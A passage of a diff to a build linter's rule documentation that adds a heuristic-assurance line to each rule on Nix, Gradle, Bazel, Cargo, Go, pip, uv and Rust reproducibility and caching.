 **Why:** The fake-hash workflow uses an empty or well-known placeholder digest to make a fixed-output build print its actual digest. Such values normally cause a mismatch if the corresponding derivation is built; static syntax alone cannot establish that an expression is evaluated or really feeds a fetcher. Templates can intentionally contain placeholders. Review the downloaded source independently before accepting a newly printed digest. vendorHash = null is not treated as a placeholder.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: policy; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `ignorePaths` (default `[]`)
@@ -3407,6 +3499,7 @@ References:
 
 **Why:** fetchGit resolves a remote ref during evaluation. Without a revision or supported content-hash pin, a mutable branch or tag can select different source over time. Pure evaluation rejects unlocked inputs if evaluated. A full revision identifies a Git object, but does not guarantee local cache presence, remote availability, identical fetcher metadata across options or deterministic downstream builds.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: policy; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3440,6 +3533,7 @@ References:
 
 **Why:** fetchTarball downloads and unpacks during evaluation. Without an expected sha256, mutable URLs may yield different sources when cache entries expire; cache and offline settings affect revalidation. Pure evaluation rejects unpinned calls when evaluated. A declared digest checks unpacked source identity and permits reuse while the matching store object exists, but does not prevent garbage collection, guarantee availability or authenticate an unreviewed digest.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: policy; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3473,6 +3567,7 @@ References:
 
 **Why:** Evaluation can be a bottleneck for flakes with many expensive outputs. This detector counts output-shaped source bindings, not evaluated outputs, elapsed time or CPU use; helper functions, lazy branches, systems and Nix versions can change the work. Parallel evaluators or job matrices may help but add overhead. Building checks with another tool does not replace flake-check validation of other output types: retain nix flake check --no-build with equivalent system/options coverage and test the combined behavior. Pin and review any additional tooling.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `insights`
 - Options: `threshold` (default `10`)
@@ -3507,6 +3602,7 @@ flake.lock is out of date with flake.nix: an input has no lock entry, was change
 
 **Why:** An added or changed input may require lock regeneration; mutable references can then resolve differently, while immutable references need not. --no-update-lock-file rejects required updates, whereas --no-write-lock-file alone does not freeze resolution. This rule compares only supported literal source forms and reports direct references to missing nodes. A consistent lock constrains sources, not all build behavior.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3541,6 +3637,7 @@ A flake names an additional binary cache without recognized configuration at a C
 
 **Why:** Flake-provided substituters need appropriate acceptance and trust, or equivalent configuration outside the flake. This rule compares visible preceding installer/actions, per-command configuration and local flake targets on recognized hosted runners. External trust decisions, daemon policy and other cache sources may still provide reuse. A complete inventory is required, but it does not reveal runtime state or prove cache misses. Prefer explicitly reviewed cache URLs/keys to broadly accepting pull-request-controlled flake settings.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `strict`
 - Requires: `complete-inventory`
@@ -3581,6 +3678,7 @@ A push/pull_request CI job runs `nix flake update` (or `--update-input`/`--recre
 
 **Why:** Updating a lock in ordinary push/PR CI can resolve mutable inputs differently from the committed lock. Pinned or unchanged inputs need not change, other steps may preserve the result, and neither a lock nor this detector proves reproducible builds. Separating reviewed dependency updates from frozen-lock build checks makes the tested source set clearer. Explicit local-input refreshes and recognized publication paths can be intentional.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3622,6 +3720,7 @@ Nix expressions should not read environment variables with `builtins.getEnv` dur
 
 **Why:** A demanded `builtins.getEnv` call can make evaluation depend on the calling process's environment. Under pure or restricted evaluation it returns an empty string. This can change derived results, but an unused lazy reference need not be called or affect a derivation. Values embedded in derivation attributes can be serialized into `.drv` files in the normally world-readable Nix store; merely using a value in a condition does not imply the original value is stored. Pass non-secret configuration explicitly and keep secrets outside derivations.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `strict`
 - Options: `allow` (default `[]`)
@@ -3654,6 +3753,7 @@ A flake input fetches a github.com repository with `git+https://` or `git+ssh://
 
 **Why:** A `git+…` flake reference uses Git, while `github:` downloads a commit tarball. The Nix manual describes the tarball fetcher as often faster and smaller; shallow Git fetches and warm caches reduce that difference. Fetcher changes can affect authentication, source metadata such as revCount and lockfile contents, so review and re-lock them rather than treating them as behavior-preserving edits.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `strict`
 
@@ -3683,6 +3783,7 @@ References:
 
 **Why:** `nix-env -i` without `-f` evaluates `~/.nix-defexpr`, i.e. the user's channels, whose nixpkgs revision is whatever the image or the last `nix-channel --update` fetched; `-f channel:…` or a branch tarball fetches the branch head again whenever the cached tarball expires. `nix profile install nixpkgs#pkg` resolves the indirect `nixpkgs` reference through the flake registry (the global registry maps it to `github:NixOS/nixpkgs/nixpkgs-unstable`), and `github:owner/repo` without a commit follows that repository's default branch. None of these record the revision in the repository, so the tool version — and its dependency closure — changes with upstream pushes rather than with the commit under test, and an old commit cannot be re-run with the tools it was tested with. The install also mutates a user profile, which outlives the job on self-hosted runners. Taking nixpkgs from the repository's `flake.lock` (`--inputs-from .`), a commit tarball, or a `devShells` entry used through `nix develop` keeps the tools pinned and reviewable.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3716,6 +3817,7 @@ Nix expressions should not import or read files produced by a derivation during 
 
 **Why:** IFD demands derivation output during evaluation. If unavailable, it may need realization before evaluation continues, and evaluators disabling IFD reject demanded uses. Existing store outputs or substitutes can avoid rebuilding. This lexical detector recognizes conventional producers/readers and selected helpers; it cannot resolve arbitrary bindings, laziness or runtime cost. IFD is not itself proof of impurity. Committing generated code or moving generation to build time can remove an evaluation dependency, but needs regeneration policy and behavioral testing.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `allow` (default `[]`)
@@ -3753,6 +3855,7 @@ References:
 
 **Why:** Flake commands evaluate in pure mode: the result is a function of the flake source and the revisions pinned in flake.lock, which is what makes a CI result reproducible and lets a binary cache serve the same outputs everywhere. `--impure` ("Allow access to mutable paths and repositories"), `--no-pure-eval` and `--option pure-eval false` switch that off, so the expression may read environment variables through `builtins.getEnv` (the usual reason is `NIXPKGS_ALLOW_UNFREE=1`), resolve `<nixpkgs>` from whatever `NIX_PATH` the runner has, use `builtins.currentSystem`/`builtins.currentTime`, read files outside the flake by absolute path, and fetch URLs without a hash. None of that is recorded in flake.lock, so the same commit can evaluate to different derivations on another runner or a later rerun, and the impurity silently spreads to every output that depends on it. Each of these needs has a pure equivalent: nixpkgs `config` in the flake, systems enumerated in `outputs`, inputs declared and locked.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3783,6 +3886,7 @@ A flake input is an indirect reference (`nixpkgs`, `flake:nixpkgs`, or no `url` 
 
 **Why:** An indirect flake reference names a registry entry instead of a source. Nix resolves it through the flake registries: the global registry (downloaded from the `flake-registry` setting and refreshed when older than `tarball-ttl`), then `/etc/nix/registry.json` (NixOS `nix.registry`), then `~/.config/nix/registry.json`, then `--override-flake`, the later taking precedence. flake.lock records what it resolved to once, but every `nix flake update` or re-lock resolves it again on whichever machine runs it, so a developer's `nix registry pin`, a NixOS `nix.registry` entry or a change to the global registry silently changes the source CI builds. An input with no `url`/`type`, or an `outputs` argument that is not declared under `inputs`, is the same indirect reference.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3813,6 +3917,7 @@ A pinned nix-installer-action still installs whatever Nix version is newest at r
 
 **Why:** DeterminateSystems/nix-installer-action downloads the most recent Determinate Nix Installer on every run, even when the action itself is pinned to a tag or commit, so the Nix version (evaluator, store schema, default settings, built-in fetchers) changes underneath a workflow whose author pinned the action for reproducibility. A Nix upgrade can change evaluation results, error on deprecated syntax, or alter `flake.lock` handling without any change in the repository. determinate-nix-action is tagged for every Determinate Nix release, so `@vX.Y.Z` installs exactly that release and Dependabot can propose upgrades as reviewable pull requests; alternatively `source-tag` pins the installer binary used by nix-installer-action.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `strict`, `insights`
 
@@ -3842,6 +3947,7 @@ Nix's `max-jobs` is pinned to a very small number on a GitHub-hosted runner.
 
 **Why:** max-jobs limits concurrent local derivation builds; cores separately controls the parallelism a builder may use. A low explicit limit may leave capacity unused when independent uncached derivations are single-threaded. It can also be necessary to avoid memory exhaustion or oversubscription. This detector follows observed configuration precedence at build commands, but does not measure resource use, dependency parallelism or remote-daemon policy. Tune only after measuring representative builds.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `strict`
 - Options: `max` (default `1`)
@@ -3881,6 +3987,7 @@ A flake.nix with inputs has no flake.lock committed next to it.
 
 **Why:** flake.lock records resolved input identities. Without it, mutable references can resolve differently between runs, unless an external lock policy or explicit immutable inputs constrain them. Local or already revision-pinned inputs do not necessarily move. Committing and reviewing the lock improves source traceability; it does not prove deterministic outputs or cache hits. This absence check requires a complete repository inventory.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 - Requires: `complete-inventory`
@@ -3916,6 +4023,7 @@ Review Nix sandboxing and store-cache reuse when Dockerfile RUN instructions bui
 
 **Why:** Docker's isolation boundary is not the Nix build sandbox. Some nixos/nix releases disable Nix sandboxing for container compatibility, but a name, mirror or tag does not establish the running configuration or namespace capabilities. A missed BuildKit layer can repeat Nix work, while parent layers, cache mounts and substituters may still provide reuse. Moving image construction outside Docker changes build/runtime assumptions and must be validated; it does not automatically enable sandboxing or guarantee one layer per store path.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `strict`
 
@@ -3959,6 +4067,7 @@ Ad-hoc `nix-shell -p` / `nix run nixpkgs#…` / `nix shell nixpkgs#…` tools co
 
 **Why:** `nix-shell -p pkg` evaluates `with import <nixpkgs> {}; …`, so the packages come from whatever the `nixpkgs` entry of the search path (`-I`, then `NIX_PATH`, then the `nix-path` setting) points at; a `channel:nixos-unstable` or `…/archive/nixos-unstable.tar.gz` entry is downloaded afresh once the tarball cache expires and follows the branch. Likewise `nix run nixpkgs#pkg` and `nix shell nixpkgs#pkg` resolve the indirect `nixpkgs` reference through the flake registry, whose global entry is `github:NixOS/nixpkgs/nixpkgs-unstable`, and nothing records the revision used. Either way the tool version (and every dependency of it) changes with upstream pushes rather than with the commit under test, so a rerun of an old commit can build or lint differently and cache hits are lost whenever the branch moves. Pinning nixpkgs to a commit, or resolving `nixpkgs` from the repository's own `flake.lock` with `--inputs-from .`, makes the tool part of the reviewed inputs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -3994,6 +4103,7 @@ Nix expressions should not use `<nixpkgs>`-style lookup paths, which resolve thr
 
 **Why:** Lookup paths resolve through search-path configuration, including NIX_PATH, nix-path and -I flags. That configuration may be pinned externally or may follow a mutable channel; this file-level detector does not establish which. Explicit pinned inputs make the dependency easier to audit. Pure evaluation disables ordinary external search-path resolution. A source pin is not a proof of deterministic builds or cache hits.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `ignore` (default `[]`)
@@ -4030,6 +4140,7 @@ A nixpkgs flake input tracks `master`, a `release-*` or `staging*` branch instea
 
 **Why:** Development branches can advance before channel release gates finish. Channel branches are gated by selected jobs, not every package, architecture, license configuration or overlay. A development-branch lock may already have substitutes, and a channel lock may still require local builds. Inspect the chosen revision's actual substitutes before switching source policy, then review and test the changed lock.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -4059,6 +4170,7 @@ A hosted job builds local Nix targets with no additional binary cache visible be
 
 **Why:** A cache can avoid rebuilding outputs unavailable from the default substituter on fresh runners. A local target may simply reuse nixpkgs packages already in cache.nixos.org, and external machine configuration may provide another cache, so absence in the inspected repository is not proof of cache misses. Measure repeated uncached builds before adopting authenticated cache persistence; scope write credentials to trusted jobs and account for storage, transfer and exposure costs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: high
 - Presets: `recommended`, `strict`
 - Requires: `complete-inventory`
@@ -4101,6 +4213,7 @@ A committed flake.lock has no Dependabot, Renovate or scheduled workflow keeping
 
 **Why:** Committed locks require deliberate maintenance. Repository-visible Dependabot, Renovate or update workflows can make that maintenance reviewable, but external services and manual targeted updates may already provide it. A commit timestamp is not a vulnerability assessment or proof of neglect. Even a small update can change a large build closure; automation does not guarantee smaller cache misses. Review and test update pull requests before merging.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `strict`
 - Requires: `complete-inventory`
@@ -4146,6 +4259,7 @@ Review Magic Nix Cache action refs that predate v11's restored support.
 
 **Why:** Upstream v11 explicitly restored support, removed the retirement warning and added GITHUB_CONTEXT to the downloaded daemon's environment. The action wrapper version alone does not determine the downloaded binary or prove an actual cache failure: source overrides, service configuration and GitHub Enterprise Server differ. Review runtime logs and supported versions before an upgrade or migration; neither is an unattended behavior-preserving fix.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -4177,6 +4291,7 @@ Overlays should not globally replace foundational packages such as `stdenv`, `gl
 
 **Why:** A package-set overlay can change inputs widely, especially foundational libraries and bootstrap packages. Rebinding alone does not establish changed derivations: metadata-only overrides or equivalent values can retain store paths, and changed outputs may already exist in a cache. Evaluate the before/after derivation graph and substitutability before deciding whether to narrow an intentional override. Scoped overrides also change dependency policy and require testing.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: warn; impact: high
 - Presets: `strict`, `insights`
 - Options: `packages` (default `["stdenv","glibc","openssl","zlib","gcc","binutils","bash","coreutils","python3","perl","curl","systemd"]`), `allow` (default `[]`)
@@ -4215,6 +4330,7 @@ nixbuild/nix-quick-install-action silently enables `accept-flake-config`.
 
 **Why:** The recognized nix-quick-install-action releases append accept-flake-config = true after nix_conf when installing Nix newer than 2.13 (including 2.13.6). Flake-evaluating commands can then accept eligible top-level nixConfig settings without confirmation. This is a single-user installer, not evidence that a root-owned daemon honors every option. A false setting inside nix_conf is overwritten by the appended line; an effective NIX_CONFIG or CLI setting can override it. Review trust deliberately and preserve existing configuration when changing it. Unknown releases, dynamic versions and opaque configuration writes are not treated as established trust.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `strict`
 
@@ -4258,6 +4374,7 @@ Do not cache `/nix/store` or `/nix/var/nix` with actions/cache; use a Nix-aware 
 
 **Why:** The Nix store is only consistent together with its SQLite database (`/nix/var/nix/db/db.sqlite`), which records which store paths are valid and their references. actions/cache archives and extracts plain files as the runner user: on a multi-user install `/nix/store` is root-owned and read-only, so extraction can fail with permission errors, and restoring the store without the database (or a stale database over the one the installer just created) leaves paths Nix does not consider valid or registrations for paths that are missing. Nothing is garbage-collected before saving, so every save carries the whole store towards the 10 GB repository cache limit. nix-community/cache-nix-action merges the restored and current databases and can collect garbage before saving; a binary cache (Cachix, Attic, FlakeHub Cache) substitutes individual paths through Nix itself.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -4294,6 +4411,7 @@ Rust crates built from local source should compile dependencies in a separate, c
 
 **Why:** Standard buildRustPackage separates dependency source fetching from package compilation, not necessarily dependency compilation from workspace compilation. When included local source changes, the package derivation can change, and a cache miss may rebuild dependency crates. Two-phase builders such as crane can reuse compatible compiled artifacts, but their inputs also include toolchains, features, native dependencies and build scripts, not only Cargo.lock. Custom phases and compiler caches can already provide reuse. Measure representative builds and preserve all build behavior before migrating.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `strict`, `insights`
 - Options: `allow` (default `[]`)
@@ -4335,6 +4453,7 @@ The Nix build sandbox is turned off or relaxed in CI, in flake nixConfig, or by 
 
 **Why:** Nix sandboxing restricts access to undeclared host state. Disabling or relaxing it can make additional inputs available, but does not establish that a derivation uses them or produces different bytes. Input-addressed store paths identify declared inputs, not a proof of deterministic output. This rule follows observed configuration precedence at build commands and also reports explicit flake requests and recognizable derivation __noChroot attributes. Restricted daemon settings, remote builders, unsupported shell code and container namespace support cannot be established statically. macOS and container jobs are conservatively omitted rather than assuming Linux defaults apply. No isolation change is automatic.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: policy; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -4369,6 +4488,7 @@ Consecutive `nix build` commands in one job that could be a single `nix build` o
 
 **Why:** Each `nix build` is a separate Nix process: it locks and evaluates the flake again (shared work such as importing nixpkgs is repeated, because the evaluation cache only records final attribute values), then realises that installable's closure before the shell moves on. The next invocation cannot start building until the previous closure is finished, so while the last few derivations of one installable build, cores that `max-jobs` would let Nix use for the next one stay idle. `nix build .#a .#b` evaluates both installables in one evaluator and hands the union of their closures to one scheduler, which builds independent derivations concurrently and shares common dependencies. Out links become `result`, `result-1`, ... in installable order.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `strict`
 - Options: `minBuilds` (default `2`)
@@ -4401,6 +4521,7 @@ Derivations should not use the whole repository (`src = ./.`) as their source.
 
 **Why:** A broad source path can include files unrelated to the build. Changes to included files affect the source store path and can invalidate derivation reuse, although another cache may already contain the new result. Git-flake filtering and builder-specific filtering affect the actual file set. Selecting all necessary inputs with a fileset can reduce invalidation; omitting a required build script, fixture or generated input changes behavior. Measure and test rather than applying a guessed file list automatically.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `allow` (default `[]`)
@@ -4447,6 +4568,7 @@ Gradle builds run in CI should enable the build cache with `org.gradle.caching=t
 
 **Why:** Gradle's build cache is opt-in. It can reuse eligible task outputs when matching cache entries are available; ordinary up-to-date checks and existing outputs can still avoid work without it. Reuse across ephemeral runners requires cache persistence or a remote cache. Custom tasks must declare their inputs correctly before caching is safe. This detector only sees repository configuration and workflow invocations, not user-home properties, external init scripts or runtime cache hits.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 - Requires: `complete-inventory`
@@ -4486,6 +4608,7 @@ Gradle 8.1+ builds run in CI could enable the configuration cache with `org.grad
 
 **Why:** A compatible configuration-cache entry can avoid repeating configuration for matching tasks and inputs and allow more task concurrency. Entry availability, worker limits, task dependencies and plugin compatibility determine the benefit. The cache became stable in Gradle 8.1; this detector sees repository properties and explicit invocation options, not all user-home/init-script configuration. Validate isolation, secret handling and persistence before opting in.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `strict`
 - Requires: `complete-inventory`
@@ -4526,6 +4649,7 @@ Multi-project Gradle builds run in CI could execute independent subprojects in p
 
 **Why:** Enabling parallel project execution can overlap independent subproject tasks, subject to task dependencies, worker limits and shared-resource constraints. Other concurrency, including worker APIs or configuration-cache task execution, may already exist. Source-level include declarations do not establish an independent runtime task graph. Measure representative builds and validate shared mutable state before changing scheduling.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `strict`
 - Requires: `complete-inventory`
@@ -4564,6 +4688,7 @@ Bazel workspaces built in CI should pin the Bazel version in a checked-in `.baze
 
 **Why:** Bazelisk resolves Bazel using its environment/configuration and version file. Without a visible choice, its fallback can track newer releases; floating labels intentionally do so. Plain Bazel does not select versions this way, so only explicit bazelisk commands or bazel commands after a recognized Bazelisk setup are considered. External configuration, cache state and installer versions can change resolution. An exact reviewed release constrains the tool version, not whole-build reproducibility.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Requires: `complete-inventory`
@@ -4601,6 +4726,7 @@ Cargo commands in CI should pass `--locked` so the committed `Cargo.lock` is enf
 
 **Why:** Cargo normally reuses a compatible lockfile, but may resolve dependencies and rewrite it when manifests or configuration require a change. Absence of --locked is permission to change the lock, not evidence that it changes or that dependencies were unreviewed. --locked rejects a missing/changed lockfile; it does not prove a reproducible build or forbid network access. Apply this policy only where CI is intended to enforce a frozen dependency graph.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Requires: `complete-inventory`
@@ -4633,6 +4759,7 @@ Review incremental compilation tradeoffs in CI jobs that cache Cargo's `target/`
 
 **Why:** Incremental compilation writes session data that can help subsequent builds, including multiple compilations within the same CI job. Persisting it across runs may cost more than it saves; Swatinem/rust-cache removes it before saving. CARGO_INCREMENTAL=1 forces it on regardless of profile settings. Cargo 1.99 introduced a CI default of off, while older dev/test profiles default on absent overrides. Paths and cache behavior depend on toolchain/action versions. Benchmark before disabling incremental compilation; this is a tradeoff, not proof of wasted work.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `strict`
 - Requires: `complete-inventory`
@@ -4671,6 +4798,7 @@ CI should not let Go build commands rewrite go.mod and go.sum (`-mod=mod`, GOFLA
 
 **Why:** In modern module-aware Go builds, -mod=mod permits go.mod updates when module loading needs them. Since Go 1.16 the ordinary default is readonly unless automatic vendor mode or other configuration applies. Readonly restricts go.mod updates, not every go.sum write; go mod download may also update sums. These flags do not prove an actual graph change or absence of review. If both files must remain unchanged, verify their diff after all resolving commands.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Requires: `complete-inventory`
@@ -4706,6 +4834,7 @@ CI installs fully pinned requirements files with pip without hash-checking mode 
 
 **Why:** A version pin does not identify a unique distribution archive. Hash-checking mode checks downloaded requirement artifacts against independently reviewed hashes, rather than relying only on hashes supplied by the index. Every requirement and transitive dependency needs a pin and hash. Multiple allowed wheels, platforms and source-build dependencies can still produce different environments: hash checking is an artifact-integrity control, not a proof of reproducible or hermetic builds. External pip configuration is not evaluated.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `strict`
 
@@ -4742,6 +4871,7 @@ References:
 
 **Why:** Project-mode uv sync/run can update uv.lock when freshness checks require it; a compatible existing lock need not change. --locked rejects required lock changes, whereas --frozen skips freshness checks and --no-sync avoids synchronization. Environment equivalents depend on uv version and boolean values. This rule observes visible lock policy, not actual resolution, review history or whole-build reproducibility.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Requires: `complete-inventory`
@@ -4776,6 +4906,7 @@ CI should build Rust with a pinned toolchain release rather than the floating `s
 
 **Why:** Floating stable/beta/nightly selections can pick newer compiler and bundled-tool releases without a repository change. Deliberate compatibility jobs may want this. A reviewed version/date selection constrains the toolchain but does not prove reproducibility. Rust cache keys can incorporate compiler identity, while fallback/seeded entries may still provide reuse. Scoped toolchain files and explicit command/environment overrides take precedence according to rustup and installer behavior.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Requires: `complete-inventory`
